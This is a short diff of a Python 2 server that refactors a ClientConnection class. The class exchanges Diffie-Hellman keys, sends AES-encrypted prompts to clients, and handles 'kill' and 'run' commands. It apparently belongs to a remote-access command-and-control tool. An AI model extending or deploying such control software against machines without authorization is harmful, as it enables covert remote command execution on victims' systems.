@@ -94,28 +94,26 @@ class Server(threading.Thread):
         self.clients.remove(conn_to_remove)
 
 
-class ClientConnection(threading.Thread):
+class ClientConnection():
     alive = True
     
     def __init__(self, conn, addr):
-        super(ClientConnection, self).__init__()
         self.conn   = conn
         self.addr   = addr
         self.dh_key = crypto.diffiehellman(self.conn, server=True)
-        self.start()
     
     def send(self, prompt, cmd, action):
         if not self.alive:
             print 'Error: Client not connected.'
             return
-    
+        
+        # send prompt to client
+        self.conn.send(crypto.AES_encrypt(prompt, self.dh_key))
+
         # kill client connection
         if cmd == 'kill':
             self.conn.close()
             return
-        
-        # send prompt to client
-        self.conn.send(crypto.AES_encrypt(prompt, self.dh_key))
         
         # results of a command
         if cmd == 'run':
